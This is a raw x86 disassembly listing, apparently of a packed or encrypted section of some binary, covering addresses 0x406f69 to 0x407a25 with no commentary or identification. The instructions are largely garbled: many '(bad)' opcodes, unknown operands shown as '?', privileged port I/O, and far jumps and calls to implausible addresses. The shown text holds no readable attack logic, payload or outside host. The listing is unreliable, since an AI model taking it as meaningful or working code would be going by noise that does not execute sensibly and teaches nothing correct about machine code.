  406f69:	call   0xff62d24c
  406f6e:	pusha  
  406f6f:	xchg   esp,eax
  406f70:	jecxz  0x406f6f
  406f72:	push   cs
  406f73:	xor    BYTE PTR [ebx+0x5b1fe83e],0x8d
  406f7a:	fs pop ebp
  406f7c:	and    edi,edi
  406f7e:	test   dh,0x3a
  406f81:	mov    bh,0x22
  406f83:	bound  esp,QWORD PTR [edx]
  406f85:	lea    ebp,[esi+ebx*2+0x21]
  406f89:	(bad)  
  406f8a:	fsubp  st(0),st
  406f8c:	and    DWORD PTR [ebp-0xddb56f],esi
  406f92:	shl    DWORD PTR [edi],0xe9
  406f95:	(bad)  
  406f96:	call   0xbffc4841
  406f9b:	xor    DWORD PTR [edx],esp
  406f9d:	inc    eax
  406f9e:	out    0xa3,al
  406fa0:	es add cl,ch
  406fa3:	pop    ds
  406fa4:	rcl    BYTE PTR [ebx+ebp*4-0x6900dde6],1
  406fab:	push   ds
  406fac:	dec    ebx
  406fad:	add    cl,ch
  406faf:	pop    ds
  406fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fb1:	gs pop esp
  406fb3:	pop    esi
  406fb4:	jbe    0x407006
  406fb6:	add    BYTE PTR ds:0x85414edb,cl
  406fbc:	mov    dh,0xc6
  406fbe:	mov    dh,0x0
	...
  406fe8:	jne    0x407048
  406fea:	or     eax,eax
  406fec:	push   0x45b1e959
  406ff1:	pop    esi
  406ff2:	add    BYTE PTR [ebp-0x16338],cl
  406ff8:	repnz rol DWORD PTR [ecx+0x2c],1
  406ffc:	test   DWORD PTR [esi],esi
  406ffe:	std    
  406fff:	dec    edi
  407000:	test   BYTE PTR [esi-0x18],bl
  407003:	test   eax,0xb0056ab
  407008:	cmc    
  407009:	sub    DWORD PTR [ecx+ebp*8],eax
  40700c:	leave  
  40700d:	push   esi
  40700e:	add    BYTE PTR [eax],al
  407010:	lods   eax,DWORD PTR ds:[esi]
  407011:	loopne 0x40705a
  407013:	inc    ecx
  407014:	add    eax,0x1d0c759f
  407019:	in     eax,0xcd
  40701b:	call   DWORD PTR [edx]
  40701d:	rcl    BYTE PTR [edx+eax*8-0x72005fdd],cl
  407024:	xchg   edi,eax
  407025:	jno    0x407079
  407027:	push   eax
  407028:	sbb    eax,0xf2ffcea1
  40702d:	or     eax,0xdd575fe
  407032:	(bad)  
  407033:	jne    0x407002
  407035:	mov    ch,0x12
  407037:	push   edx
  407039:	sahf   
  40703a:	call   0xffdef038
  40703f:	jmp    0x4070a7
  407041:	rol    BYTE PTR [ecx+0x2c],cl
  407044:	sub    al,0xd9
  407046:	mov    bl,0xfe
  407048:	jb     0x406fe8
  40704a:	push   0xf
	...
  407073:	add    BYTE PTR [eax],al
  407075:	pop    es
  407076:	push   ds
  407077:	(bad)  
  407078:	(bad)  
  407079:	clc    
  40707a:	jmp    0xb5f3707c
  40707f:	push   edx
  407080:	mov    bh,0x1c
  407082:	xor    al,0x3
  407084:	or     ebx,DWORD PTR [edi+eax*2-0x3a]
  407088:	addr16 mov ecx,0x72ffc36b
  40708e:	es psubsb mm7,mm0
  407092:	stc    
  407093:	jnp    0x407094
  407095:	arpl   WORD PTR [esi-0x49],sp
  407098:	(bad)  
  407099:	pop    ebx
  40709a:	mov    eax,0x7188e7d3
  40709f:	jl     0x4070a0
  4070a1:	in     al,dx
  4070a2:	jecxz  0x407123
  4070a4:	jge    0x4070d2
  4070a6:	xor    al,0xf7
  4070a8:	or     al,0xc4
  4070aa:	mov    edx,edx
  4070ac:	inc    eax
  4070ad:	sbb    al,0xc4
  4070af:	push   0x22
  4070b1:	jae    0x4070e6
  4070b3:	add    ebp,ebx
  4070b5:	sbb    DWORD PTR [edx+eax*1-0x26cde400],ebp
  4070bc:	or     bl,ah
  4070be:	(bad)  
  4070bf:	or     DWORD PTR [edx+0xb],edx
  4070c2:	ror    BYTE PTR [edx],0xe8
  4070c5:	stos   BYTE PTR es:[edi],al
  4070c6:	push   eax
  4070c7:	jl     0x4070c8
  4070c9:	add    al,0x7f
  4070cb:	dec    ecx
  4070cc:	push   ebx
  4070ce:	scas   eax,DWORD PTR es:[edi]
  4070cf:	xchg   dl,al
  4070d1:	jmp    0xbf67:0xe3507b29
  4070d8:	inc    BYTE PTR [eax]
	...
  407102:	fstp   TBYTE PTR [ecx]
  407104:	ins    BYTE PTR es:[edi],dx
  407105:	add    BYTE PTR [edx-0x237afcce],cl
  40710b:	cmp    DWORD PTR [eax+0x7b11c310],eax
  407111:	push   DWORD PTR [ecx-0x2a]
  407114:	jns    0x407115
  407116:	mov    bl,0xa
  407118:	ja     0x4070cf
  40711a:	sbb    al,0x32
  40711c:	jp     0x4070d3
  40711e:	fs lock jp 0x407121
  407122:	test   BYTE PTR [ebx+0xd],bl
  407125:	dec    esi
  407126:	xchg   ebx,eax
  407127:	and    BYTE PTR [eax+0x3c5b1846],dh
  40712d:	(bad)  
  40712e:	jo     0x40710c
  407130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407131:	js     0x407196
  407133:	xchg   esi,eax
  407134:	test   DWORD PTR [esp+ebx*1],eax
  407137:	pop    ebx
  407138:	jmp    0x818f62b7
  40713d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40713e:	push   edx
  40713f:	and    BYTE PTR [esi+0xf],ch
  407142:	pop    esp
  407143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407144:	add    ecx,DWORD PTR [ebp-0xea1e127]
  40714a:	sbb    esp,DWORD PTR [eax]
  40714c:	fdiv   QWORD PTR [edi+0x34]
  40714f:	add    ebx,DWORD PTR [ebx+edi*2]
  407152:	cmp    ecx,DWORD PTR [ebx+0x3337f146]
  407158:	stc    
  407159:	dec    ebp
  40715a:	sub    esp,DWORD PTR [eax]
  40715c:	shl    WORD PTR [edi],0xb5
  407160:	call   0x266002df
  407165:	icebp  
	...
  40718e:	add    BYTE PTR [ebx],bl
  407190:	xor    edx,ebp
  407192:	jns    0x40719f
  407194:	and    BYTE PTR [esi],dl
  407196:	icebp  
  407197:	pop    es
  407198:	xor    esi,ecx
  40719a:	dec    ebp
  40719b:	sti    
  40719c:	pop    ds
  40719d:	xor    BYTE PTR [esi+0x20],al
  4071a0:	pop    ebx
  4071a1:	xchg   esp,eax
  4071a2:	mov    ?,eax
  4071a4:	fldcw  WORD PTR [esp+esi*2]
  4071a7:	loop   0x4071c8
  4071a9:	out    dx,al
  4071aa:	in     eax,dx
  4071ab:	(bad)  [ecx+0x53497aea]
  4071b1:	shl    DWORD PTR [edx],1
  4071b3:	jecxz  0x4071d4
  4071b5:	(bad)  
  4071b6:	mov    WORD PTR [ecx+0x1f],ds
  4071b9:	inc    ecx
  4071ba:	add    BYTE PTR ds:0x9988e95b,bl
  4071c0:	daa    
  4071c1:	mov    edi,0x8aab7a
  4071c6:	rcl    DWORD PTR [ebp+eiz*8+0x1b2ae8ff],0xf
  4071ce:	ins    DWORD PTR es:[edi],dx
  4071cf:	mov    edx,0x44e9005a
  4071d4:	push   edi
  4071d5:	add    ecx,ebp
  4071d7:	pop    ds
  4071d8:	push   eax
  4071d9:	xchg   DWORD PTR [ecx+0x1f],esi
  4071dc:	pop    ebx
  4071dd:	add    BYTE PTR [ecx],dl
  4071df:	push   ds
  4071e0:	lea    eax,[ecx-0x17]
  4071e3:	xchg   esp,eax
  4071e4:	aad    0xf6
  4071e6:	ja     0x4071ce
  4071e8:	pop    ds
  4071e9:	push   eax
  4071ea:	cmp    DWORD PTR ds:0xa066ff0e,0x5fefd5
	...
  40721c:	(bad)  
  40721d:	pop    ds
  40721e:	call   FWORD PTR [edi+ecx*8+0x474eff20]
  407225:	pop    ebx
  407226:	add    ecx,ebp
  407228:	pop    ds
  407229:	into   
  40722a:	test   BYTE PTR [esi],dh
  40722c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40722d:	pop    ds
  40722e:	call   FWORD PTR [ecx-0x57b81fc9]
  407234:	pop    ds
  407235:	mov    bl,0x1b
  407237:	mov    ebx,0xf5671ed8
  40723c:	icebp  
  40723d:	fwait
  40723e:	add    BYTE PTR [ecx],al
  407240:	(bad)  
  407242:	(bad)  
  407243:	call   0xd8b48d72
  407248:	add    DWORD PTR [edi],ebx
  40724a:	mov    WORD PTR [esi+ebp*2+0x1d],fs
  40724e:	push   esi
  407250:	into   
  407251:	sbb    eax,0xc147e175
  407256:	cld    
  407257:	out    0x55,al
  407259:	push   ds
  40725a:	mov    ch,0xd9
  40725c:	inc    esi
  40725d:	push   ds
  40725e:	inc    DWORD PTR [ecx+0x1c]
  407261:	pop    esp
  407262:	add    cl,ch
  407264:	mov    ds:0xdb00f6d8,al
  407269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40726a:	call   DWORD PTR [eax+0x4d]
  40726d:	in     al,0x47
  40726f:	inc    ecx
  407270:	mov    ch,0x32
  407272:	push   ds
  407273:	push   edx
  407274:	inc    esp
  407275:	push   edi
  407276:	push   0xff1a5714
  40727b:	out    0x8d,eax
  40727d:	in     eax,dx
  40727e:	(bad)  
  40727f:	inc    DWORD PTR [eax]
	...
  4072a9:	jle    0x407245
  4072ab:	je     0x4072be
  4072ad:	pop    ds
  4072ae:	push   edi
  4072af:	lea    eax,[ebp-0x5f0e]
  4072b5:	add    eax,0x9d0875a4
  4072ba:	add    al,0xfc
  4072bc:	dec    edx
  4072be:	mov    ds:0xa3bbf0b5,eax
  4072c3:	(bad)  
  4072c4:	call   0x40043e
  4072c9:	pop    edi
  4072ca:	outs   dx,DWORD PTR ds:[esi]
  4072cb:	call   0xffe48b61
  4072d0:	or     eax,DWORD PTR ds:0xf0681b2b
  4072d6:	or     DWORD PTR [eax+0x0],eax
  4072d9:	test   DWORD PTR [edx-0x5bb532e3],esi
  4072df:	push   eax
  4072e0:	push   0x5
  4072e2:	or     bh,dh
  4072e4:	jne    0x4072f3
  4072e6:	mov    dl,0x32
  4072e8:	std    
  4072e9:	sub    ah,BYTE PTR [eax+ebp*8-0x5bc3e7]
  4072f0:	push   0x400a21
  4072f5:	(bad)  
  4072f6:	aas    
  4072f7:	push   DWORD PTR [ebp-0x3]
  4072fa:	mov    cl,0xaa
  4072fc:	dec    dl
  4072fe:	mov    ds:0x1a14e468,al
  407303:	jmp    FWORD PTR [ecx+0x16]
  407306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407307:	jne    0x407311
  407309:	sbb    al,0x1c
  40730b:	pushf  
  40730c:	inc    BYTE PTR [eax]
	...
  407336:	mov    ebx,0x4de3eb0c
  40733b:	jae    0x407341
  40733d:	push   0x8
  40733f:	fucomp st(5)
  407341:	pop    es
  407342:	mov    ah,0xb7
  407344:	jns    0x407345
  407346:	fwait
  407347:	in     al,dx
  407348:	in     eax,dx
  407349:	sti    
  40734a:	xchg   ebx,eax
  40734b:	ds or  al,0xe8
  40734e:	jmp    0x407345
  407350:	ja     0x407351
  407352:	push   ebp
  407353:	icebp  
  407354:	(bad)  
  407355:	call   eax
  407357:	mov    eax,0x341c6867
  40735c:	push   0x7266bbe
  407361:	(bad)  
  407362:	jmp    0x4b17dea2
  407367:	lods   al,BYTE PTR ds:[esi]
  407368:	js     0x407333
  40736a:	pop    esi
  40736b:	sub    eax,DWORD PTR [ebx]
  40736d:	push   ebp
  40736e:	xchg   edi,eax
  40736f:	pop    DWORD PTR [esp+eax*8-0x44193bc]
  407376:	sbb    al,0x34
  407378:	add    eax,DWORD PTR [eax]
  40737a:	mov    eax,ds:0xb45076ee
  40737f:	dec    ebp
  407380:	(bad)  
  407381:	inc    eax
  407382:	sbb    al,0x65
  407384:	out    dx,al
  407385:	or     ebx,DWORD PTR [ebx]
  407387:	sub    BYTE PTR [edx+0x48],ah
  40738a:	pop    ebp
  40738b:	xor    ch,BYTE PTR [ebx-0x46]
  40738e:	xlat   BYTE PTR ds:[ebx]
  40738f:	cmp    eax,0xbedc0b78
  407394:	sbb    BYTE PTR [ecx+0xeb4a61],cl
	...
  4073c2:	add    BYTE PTR [eax*2+0x1e71ffb9],bl
  4073c9:	ja     0x407440
  4073cb:	in     al,0x25
  4073cd:	in     eax,dx
  4073ce:	pop    es
  4073cf:	(bad)  
  4073d0:	repnz push 0xe65bd3ff
  4073d6:	icebp  
  4073d7:	shl    DWORD PTR [ebx],cl
  4073d9:	imul   ecx,DWORD PTR [ebx+eax*8+0x1c],0x5b2442a0
  4073e1:	xor    al,0x8b
  4073e3:	rcr    dl,0xac
  4073e6:	mov    al,0xaa
  4073e8:	sbb    al,0xbe
  4073ea:	aas    
  4073eb:	cdq    
  4073ec:	jecxz  0x4073a4
  4073ee:	ja     0x40738b
  4073f0:	pop    ebx
  4073f1:	jmp    0x2c108ff9
  4073f6:	or     BYTE PTR [edi],dl
  4073f8:	sbb    edx,DWORD PTR ds:0xe9639c01
  4073fe:	lock and BYTE PTR [edx],dh
  407401:	in     eax,0x4
  407403:	sbb    al,0x5b
  407405:	xchg   cl,dh
  407407:	sbb    ebx,DWORD PTR [esp+esi*8]
  40740a:	pop    es
  40740b:	je     0x40743c
  40740d:	mov    ds:0x198b5b77,al
  407412:	ja     0x4073dd
  407414:	push   edx
  407415:	push   ecx
  407416:	fimul  WORD PTR [edx+0x1c]
  407419:	pop    esi
  40741a:	ins    BYTE PTR es:[edi],dx
  40741b:	add    dl,BYTE PTR [ebx]
  40741d:	push   esi
  40741e:	ja     0x4073e4
  407420:	pop    ecx
  407421:	mov    ecx,0xbc1d33c4
  407426:	pop    es
	...
  40744f:	add    BYTE PTR [ebx+ecx*1],dh
  407452:	xor    dh,BYTE PTR [edi+0x23]
  407455:	shr    BYTE PTR [ebx-0x44],cl
  407458:	sbb    bl,BYTE PTR [esi+ebp*1]
  40745b:	in     al,dx
  40745c:	push   ecx
  40745d:	pop    edx
  40745e:	jmp    0x2b160d66
  407463:	jbe    0x407468
  407465:	sbb    al,0xb9
  407467:	imul   esp,DWORD PTR [ebx+edx*1+0xe],0x77
  40746c:	mov    eax,ds:0xeb762ad5
  407471:	sbb    ebx,DWORD PTR [ecx-0x1d568a]
  407477:	not    BYTE PTR [edx+0x1c]
  40747a:	call   0x9b02f2
  40747f:	jo     0x40741d
  407481:	fdivp  st(5),st
  407483:	fimul  WORD PTR [edx-0x65]
  407486:	(bad)  
  407488:	call   0xc1c5:0xa4e9005a
  40748f:	(bad)  
  407490:	xor    bl,BYTE PTR [edi+esi*8]
  407493:	jmp    0x4074a4
  407495:	pop    ebx
  407496:	add    cl,ch
  407498:	mov    esp,DWORD PTR [edi+0x1cdd548d]
  40749e:	jmp    DWORD PTR [esi+0x392c9894]
  4074a4:	jo     0x4074c5
  4074a6:	dec    edi
  4074a7:	sub    BYTE PTR [eax],ah
  4074a9:	xor    edx,DWORD PTR [ecx+0x5a]
  4074ac:	pop    ds
  4074ad:	pop    ebx
  4074ae:	or     ebp,DWORD PTR [ecx+0x23eb596c]
	...
  4074dc:	add    BYTE PTR [ebp-0x2d883e3b],dl
  4074e2:	sbb    ecx,DWORD PTR [ebp+0x688b042b]
  4074e8:	bound  ebx,QWORD PTR [bp+si+0x5100]
  4074ed:	repnz out 0xff,eax
  4074f0:	call   0xebb5901b
  4074f5:	(bad)  
  4074f6:	call   0x3eff:0x1cdd5c8d
  4074fd:	xchg   esp,eax
  4074fe:	cwde   
  4074ff:	sub    al,0x60
  407501:	pushf  
  407502:	iret   
  407503:	std    
  407504:	mov    al,BYTE PTR cs:[ebx+0x1ae0b1bd]
  40750b:	(bad)  
  40750c:	xchg   esp,eax
  40750d:	sbb    eax,DWORD PTR [ebx]
  40750f:	cmp    al,0x22
  407511:	jb     0x40752d
  407513:	call   DWORD PTR [ebx+eax*8+0x19]
  407517:	inc    DWORD PTR [eax]
  407519:	and    ch,BYTE PTR [esi]
  40751b:	out    0x84,eax
  40751d:	cs xchg ecx,eax
  40751f:	(bad)  
  407520:	call   FWORD PTR [eax+0x6e]
  407523:	push   eax
  407524:	call   0x401a77
  407529:	add    eax,0xcd75fe2f
  40752e:	xchg   BYTE PTR [ecx-0x176f2d02],ah
  407534:	jns    0x4075b0
  407536:	nop
  407537:	dec    DWORD PTR [ebp-0x162c8]
  40753d:	bound  ebp,QWORD PTR [edi]
  40753f:	(bad)  
  407540:	mov    ch,0x0
	...
  40756a:	adc    DWORD PTR [ecx-0x45a20001],edx
  407570:	mov    dl,0x0
  407572:	jne    0x40750d
  407574:	ror    BYTE PTR [edi],0xf8
  407577:	cli    
  407578:	std    
  407579:	call   DWORD PTR [edx-0x5c434a70]
  40757f:	nop
  407580:	(bad)  
  407581:	call   0x404343
  407586:	loop   0x407551
  407588:	mov    bh,0xfe
  40758a:	ror    BYTE PTR [edi-0x6f85b618],cl
  407590:	dec    ecx
  407592:	mul    DWORD PTR [edx+0x0]
  407595:	push   ebp
  407596:	into   
  407597:	add    BYTE PTR [ebx+0x758fd1c4],0xc
  40759e:	fstp   st(7)
  4075a0:	retf   0xe2ff
  4075a3:	in     eax,0x44
  4075a5:	cld    
  4075a6:	cs sahf 
  4075a8:	je     0x40d52f
  4075ae:	fnstsw WORD PTR [ecx]
  4075b0:	push   edx
  4075b1:	inc    ecx
  4075b2:	cmc    
  4075b3:	mov    ?,WORD PTR [ebp-0x4]
  4075b6:	sub    eax,0x1cffc9d1
  4075bb:	jno    0x407591
  4075bd:	addr16 test eax,0x5bffc1d4
  4075c3:	popa   
  4075c4:	out    dx,eax
  4075c5:	pop    es
  4075c6:	hlt    
  4075c7:	scas   eax,DWORD PTR es:[edi]
  4075c8:	jbe    0x4075c9
  4075ca:	fistp  DWORD PTR [ebx+0x9]
  4075cd:	mov    DWORD PTR [eax],0x0
	...
  4075f7:	ror    DWORD PTR [eax],cl
  4075f9:	jmp    0x407673
  4075fb:	outs   dx,DWORD PTR ds:[esi]
  4075fc:	inc    ebx
  4075fd:	add    al,0xff
  4075ff:	dec    ecx
  407600:	cmp    BYTE PTR [ebx-0x63],ch
  407603:	out    0x30,al
  407605:	je     0x407657
  407607:	inc    esp
  407608:	out    dx,eax
  407609:	iret   
  40760a:	inc    eax
  40760b:	sbb    al,0x74
  40760d:	jne    0x407684
  40760f:	adc    al,0x2c
  407611:	lock std 
  407613:	fwait
  407614:	shr    BYTE PTR [edx-0x16],1
  407617:	pop    edx
  407618:	enter  0x6873,0xae
  40761c:	push   esp
  40761d:	ret    
  40761e:	inc    DWORD PTR [edx-0x7178792]
  407624:	mov    ebp,0x5bccff73
  407629:	scas   eax,DWORD PTR es:[edi]
  40762a:	push   ebx
  40762b:	fld    QWORD PTR [ebx]
  40762d:	sar    esi,cl
  40762f:	jmp    0x5a92e13f
  407634:	nop
  407635:	je     0x40761f
  407637:	shl    DWORD PTR gs:[ebx-0x1],0xb4
  40763c:	out    dx,eax
  40763d:	iret   
  40763e:	inc    eax
  40763f:	sbb    al,0xb9
  407641:	out    dx,al
  407642:	sti    
  407643:	inc    esp
  407644:	int3   
  407645:	dec    eax
  407646:	push   DWORD PTR [ebx]
  407648:	shr    edx,cl
  40764a:	mov    ah,0xcf
  40764c:	ret    0x5002
  40764f:	and    ecx,esi
  407651:	or     ch,al
  407653:	dec    ebp
  407654:	push   eax
  407655:	je     0x407656
  407657:	add    al,0xdb
  407659:	cmp    al,0xff
	...
  407683:	add    BYTE PTR [ebx],cl
  407685:	pop    esp
  407686:	es out dx,al
  407688:	pop    es
  407689:	add    al,0x49
  40768b:	cmp    eax,0x412018fb
  407690:	and    al,0x5b
  407692:	mov    ah,0x88
  407694:	clc    
  407695:	fsubr  QWORD PTR [edi+esi*2]
  407698:	dec    ebx
  407699:	test   ecx,ebp
  40769b:	jmp    0xbbc8ebf
  4076a0:	les    ebx,FWORD PTR [edx]
  4076a2:	sub    dh,BYTE PTR [ebx+ecx*8-0x1e]
  4076a6:	sub    esi,DWORD PTR [eax-0x69]
  4076a9:	push   esi
  4076aa:	inc    esp
  4076ab:	mov    esp,0x33695b5c
  4076b0:	sbb    al,0x8f
  4076b2:	adc    bl,ah
  4076b4:	add    DWORD PTR [ebp+0x34b0428],ebp
  4076ba:	lds    esi,FWORD PTR [esi+0x43e25b1c]
  4076c0:	or     BYTE PTR [ecx+0x16],bh
  4076c3:	pop    esp
  4076c4:	inc    esp
  4076c5:	sub    esp,DWORD PTR [esi+0x151b1773]
  4076cb:	sbb    ah,cl
  4076cd:	sbb    BYTE PTR [edi+edx*8-0x24],0x5a
  4076d2:	cmp    DWORD PTR [ebx-0xf],esi
  4076d5:	bound  edx,QWORD PTR [ecx+0x7e18615b]
  4076db:	pop    esp
  4076dc:	jmp    0xa94c:0x50737620
  4076e3:	lods   eax,DWORD PTR ds:[esi]
  4076e4:	dec    ebx
  4076e5:	sbb    BYTE PTR [esi+0x73],ah
	...
  407710:	add    BYTE PTR [esi-0x37],cl
  407713:	and    BYTE PTR [ebx],cl
  407715:	mov    cl,0x1d
  407717:	ret    
  407718:	or     eax,0x5be18e33
  40771d:	sub    eax,0xb6734619
  407722:	cmp    edi,DWORD PTR [esi]
  407724:	stc    
  407725:	and    eax,DWORD PTR [ebx]
  407727:	add    BYTE PTR [esi-0x72],cl
  40772a:	sbb    bh,bh
  40772c:	ret    
  40772d:	sbb    ebx,DWORD PTR [eax]
  40772f:	jne    0x407722
  407731:	addr16 ss (bad) 
  407734:	push   ds
  407735:	outs   dx,DWORD PTR ds:[esi]
  407736:	test   DWORD PTR [esi],esp
  407738:	push   ss
  407739:	cmc    
  40773a:	pop    edi
  40773b:	call   0xff58e57a
  407740:	xchg   ecx,eax
  407741:	aaa    
  407742:	lods   eax,DWORD PTR ds:[esi]
  407743:	inc    ecx
  407744:	jmp    0x1490597
  407749:	in     eax,0x16
  40774b:	(bad)  
  40774c:	out    dx,al
  40774d:	out    0x7d,eax
  40774f:	push   edx
  407750:	sub    BYTE PTR [eax],bl
  407752:	sbb    BYTE PTR [ebp-0xf],dh
  407755:	push   edi
  407756:	push   ebx
  407757:	std    
  407758:	(bad)  
  407759:	sbb    DWORD PTR cs:[ebx+edi*1+0x3cfe17e1],0xffffffa0
  407762:	jmp    FWORD PTR [edx]
  407764:	mov    esp,0xa368180e
  407769:	imul   ebx,DWORD PTR [edx+0x5f84ae00],0x180d07e8
  407773:	call   DWORD PTR [ecx]
	...
  40779d:	add    BYTE PTR [eax],ah
  40779f:	lods   al,BYTE PTR ds:[esi]
  4077a0:	inc    ecx
  4077a1:	jmp    0x81490594
  4077a6:	adc    BYTE PTR [esi],dl
  4077a8:	inc    DWORD PTR [esi+0x28534547]
  4077ae:	and    BYTE PTR [eax],bl
  4077b0:	jne    0x407793
  4077b2:	neg    DWORD PTR [esi-0x3]
  4077b5:	outs   dx,BYTE PTR ds:[esi]
  4077b6:	into   
  4077b7:	pop    ss
  4077b8:	jne    0x40781f
  4077ba:	into   
  4077bb:	lea    ecx,[eax]
  4077bd:	push   ecx
  4077be:	in     al,dx
  4077bf:	sbb    edi,edi
  4077c1:	push   esi
  4077c2:	dec    esi
  4077c3:	and    al,dl
  4077c5:	in     eax,0x1f
  4077c7:	scas   al,BYTE PTR es:[edi]
  4077c8:	mov    eax,DWORD PTR [eax]
  4077ca:	leave  
  4077cb:	loopne 0x407849
  4077cd:	or     al,0x5
  4077cf:	unpckhps xmm7,xmm7
  4077d2:	shr    BYTE PTR [edx-0x1],1
  4077d5:	jne    0x4077c0
  4077d7:	mov    DWORD PTR [ebp+0x8],esi
  4077da:	sub    eax,0x1affeaca
  4077df:	mov    DWORD PTR [ebp+0xc],esi
  4077e2:	sbb    eax,0x1affc4e5
  4077e7:	push   edi
  4077e8:	ret    0xf50c
  4077eb:	xor    ecx,DWORD PTR [edx-0x361b914]
  4077f1:	push   0xffffffc5
  4077f3:	mov    DWORD PTR [ebp+0x14],esi
  4077f6:	mov    edx,0x60ff0f0e
  4077fb:	pop    ebx
  4077fc:	call   0xffcce59a
  407801:	or     eax,DWORD PTR [eax]
	...
  40782b:	test   DWORD PTR [ebx],edx
  40782d:	pop    ebx
  40782e:	mov    DWORD PTR [eax],eax
  407830:	mov    ebp,DWORD PTR [eax+0x26]
  407833:	add    DWORD PTR [edx],ebx
  407835:	(bad)  
  407836:	(bad)  
  407837:	push   eax
  407838:	mov    ebp,eax
  40783a:	or     al,0xbc
  40783c:	mov    edi,?
  40783e:	push   0xbeef5a75
  407843:	inc    ebp
  407844:	mov    WORD PTR [ebp+0x8],?
  407847:	lea    edi,[esi+0x378afffe]
  40784d:	xor    BYTE PTR [esp+esi*1+0x5f],dl
  407851:	push   DWORD PTR [ebp-0x67]
  407854:	mov    bh,0xf1
  407856:	enter  0x8bda,0x68
  40785a:	add    DWORD PTR [ebp+0x7b],eax
  40785d:	mov    esi,0x70dba50
  407862:	call   0x400436
  407867:	dec    ebp
  407868:	inc    esi
  407869:	push   esp
  40786a:	inc    ecx
  40786b:	sbb    al,0x4
  40786d:	jo     0x4078e4
  40786f:	sub    BYTE PTR [edx+ebx*2-0x2362dc38],bl
  407876:	add    DWORD PTR [eiz*4-0x28ecaf4e],ebx
  40787d:	cli    
  40787e:	out    0x7b,eax
  407880:	inc    ebp
  407881:	jno    0x407882
  407883:	add    esi,edi
  407885:	outs   dx,BYTE PTR ds:[esi]
  407886:	call   0xffb1b7c8
  40788b:	in     eax,0x41
  40788d:	adc    al,0x0
	...
  4078b7:	add    BYTE PTR [ecx+0x79],dl
  4078ba:	pusha  
  4078bb:	push   0xffc1f855
  4078c0:	fimul  DWORD PTR [esi+0x3b80e7ff]
  4078c6:	jno    0x4078c7
  4078c8:	retf   
  4078c9:	mov    ss,WORD PTR [ebx]
  4078cb:	push   eax
  4078cc:	mov    ah,0x34
  4078ce:	cmp    edi,edi
  4078d0:	mov    ebx,0x4c13f634
  4078d5:	sub    eax,0x65b407f6
  4078da:	jno    0x4078db
  4078dc:	mov    ds:0xdd53d7ab,eax
  4078e1:	add    esi,DWORD PTR [eax+0x75]
  4078e4:	and    BYTE PTR [edi*2+0x6fc48bc8],bl
  4078eb:	jne    0x407919
  4078ed:	push   esp
  4078ee:	pop    esp
  4078ef:	aad    0x64
  4078f1:	hlt    
  4078f2:	outs   dx,DWORD PTR ds:[esi]
  4078f3:	(bad)  
  4078f4:	jmp    0xf23f4c10
  4078f9:	sti    
  4078fa:	pop    edx
  4078fb:	sbb    al,0x63
  4078fd:	fsubr  QWORD PTR [edi-0x37]
  407900:	pop    esi
  407901:	xor    eax,DWORD PTR [ebx]
  407903:	push   ebp
  407904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407905:	fild   WORD PTR [ebx-0x97bb73c]
  40790b:	or     esi,DWORD PTR [edx+ebx*2]
  40790e:	add    eax,0xf2153b3b
  407913:	inc    ebx
  407914:	test   al,0xa0
  407916:	pusha  
  407917:	(bad)  
  407918:	daa    
  407919:	sub    cl,0x3
	...
  407944:	add    BYTE PTR [ebx],dh
  407946:	aam    0xd0
  407948:	sub    DWORD PTR [eax-0x66],esi
  40794b:	jmp    0x365802c0
  407950:	mul    BYTE PTR [ebx]
  407952:	add    esp,DWORD PTR [edx+0x70]
  407955:	add    edx,DWORD PTR ds:0x41c0291
  40795b:	pop    edi
  40795c:	fld    TBYTE PTR [edi+ebp*4]
  40795f:	test   al,0x3
  407961:	jmp    0x4078f1
  407963:	or     eax,0x11636970
  407968:	stc    
  407969:	ficom  DWORD PTR [esi+edi*8]
  40796c:	ficomp DWORD PTR ds:0x34b1065b
  407972:	push   edi
  407973:	xchg   ebp,eax
  407974:	ret    0x15c3
  407977:	pop    esp
  407978:	jo     0x407935
  40797a:	mov    ?,ecx
  40797c:	pop    ebx
  40797d:	cmp    eax,0xab6fd614
  407982:	mov    cs,ebp
  407984:	pop    esp
  407985:	sub    bl,BYTE PTR [edi]
  407987:	(bad)  
  407988:	outs   dx,DWORD PTR ds:[esi]
  407989:	gs sbb ecx,esi
  40798c:	add    ebp,ecx
  40798e:	ffreep st(4)
  407990:	and    DWORD PTR [eax+0x17],0x43
  407994:	add    al,0xf6
  407996:	pop    ebp
  407997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407998:	stc    
  407999:	and    eax,DWORD PTR [ebx]
  40799b:	add    DWORD PTR [ebp+0x73],0x67c96014
  4079a2:	adc    DWORD PTR [esi+0x115adcd3],0xffffffb1
	...
  4079d1:	add    bh,ch
  4079d3:	cdq    
  4079d4:	jmp    0x3a8347
  4079d9:	and    BYTE PTR [ecx+0x14],ah
  4079dc:	(bad)  
  4079dd:	hlt    
  4079de:	inc    edi
  4079df:	cld    
  4079e0:	lods   eax,DWORD PTR ds:[esi]
  4079e1:	addr16 retf 
  4079e3:	adc    ebp,DWORD PTR [eax-0x10]
  4079e6:	dec    ebx
  4079e7:	fwait
  4079e8:	add    cl,al
  4079ea:	shl    BYTE PTR [edi+0x4db2e941],1
  4079f0:	loope  0x4079a3
  4079f2:	loopne 0x407a07
  4079f4:	(bad)  
  4079f5:	mov    ah,0x17
  4079f7:	cld    
  4079f8:	xchg   ebp,eax
  4079f9:	aaa    
  4079fa:	jnp    0x407a10
  4079fc:	push   0x9aebdf
  407a01:	xchg   ecx,eax
  407a02:	lods   al,BYTE PTR ds:[esi]
  407a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a04:	inc    ecx
  407a05:	jmp    0xa221c88c
  407a0a:	loopne 0x407a1f
  407a0c:	(bad)  
  407a0d:	xchg   esp,eax
  407a0e:	out    0xfb,eax
  407a10:	jge    0x407a19
  407a12:	dec    ebx
  407a13:	adc    al,0x68
  407a15:	loop   0x407a02
  407a17:	call   0xe941:0xa78c8100
  407a1e:	xor    cl,BYTE PTR [esi-0x1f]
  407a21:	xor    ecx,esp
  407a23:	adc    edi,esi
  407a25:	push   esp
